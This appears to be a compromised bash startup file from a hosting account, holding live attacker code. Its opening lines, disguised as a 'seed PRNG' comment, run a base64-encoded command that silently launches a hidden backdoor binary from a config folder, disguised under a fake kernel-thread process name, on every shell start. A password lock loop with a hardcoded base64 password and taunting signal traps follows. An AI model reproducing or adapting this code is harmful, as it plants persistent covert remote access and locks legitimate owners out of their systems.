# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
{ echo L3Vzci9iaW4vcGtpbGwgLTAgLVUxMDAxIGRlZnVuY3QgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUvZW1idW5pLmFjLmtlLy5jb25maWcvaHRvcC9kZWZ1bmN0LmRhdCAtbGlxRCIgZXhlYyAtYSAnW3NsdWJfZmx1c2h3cV0nICcvaG9tZS9lbWJ1bmkuYWMua2UvLmNvbmZpZy9odG9wL2RlZnVuY3QnIDI+L2Rldi9udWxsKQo=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel
case $- in
    *i*) ;;
    *) return ;;
esac
trap 'echo -e "\n\e[1;31mNgapain...\e[0m\n"' INT
trap 'echo -e "\n\e[1;31mNgapain??...\e[0m\n"' TSTP
expected_b64="QWExMTIyNDRDeWJyMHg="
input_b64=""
while [[ "$input_b64" != "$expected_b64" ]]; do
    clear
    echo -e "\e[1;33m"
echo "   ██████╗        ██╗              ██████╗ "
echo "  ██╔════╝        ██║             ██╔══██╗"
echo "  ██║     ██╗   ██╗██████╗ ██████╗██║  /██║██╗  ██╗"
echo "  ██║     ██║   ██║██╔══██╗██╔══╝██║  / ██║╚██╗██╔╝"
echo "  ╚██████╗╚██████╔╝██████╔╝██║   ╚██ /  ██╔╝╚███╔╝ "
echo "   ╚═════╝ ╚═══██║ ╚═════╝ ╚═╝    ╚██████╔╝ ██╔██╗ "
echo "          ██   ██║                 ╚════╝  ██╔╝ ██╗"
echo "          ╚█████╔╝                         ╚═╝  ╚═╝"
echo "           ╚════╝"
    echo -e "\e[0m"
    echo -e "\e[1;32m════════════════════════════════════════════════════════════════\e[0m"
    echo -e "\e[1;36m          Jangan Bandel Ya\e[0m"
    echo -e "\e[1;32m════════════════════════════════════════════════════════════════\e[0m"
    echo ""
    echo -ne "Password: "
    read -s input_pass
    echo
    input_b64=$(printf "%s" "$input_pass" | base64 | tr -d '\n')
    if [[ "$input_b64" != "$expected_b64" ]]; then
        echo -e "\e[1;31m✖ system: Authentication failure\e[0m"
        sleep 2
    fi
done
clear
echo -e "\e[1;32m✔ Authentication successful!\e[0m"
echo ""
echo -e "      Welcome to the secure system."
echo -e "      You now have access to authorized commands."
timenow=$(date +'%H:%M')
load=$(awk '{print $1 ", " $2 ", " $3}' /proc/loadavg)
echo -e "\e[1;36mCurrent system time (UTC): $timenow\e[0m"
echo -e "\e[1;36mServer load average: $load\e[0m"
echo -e ""
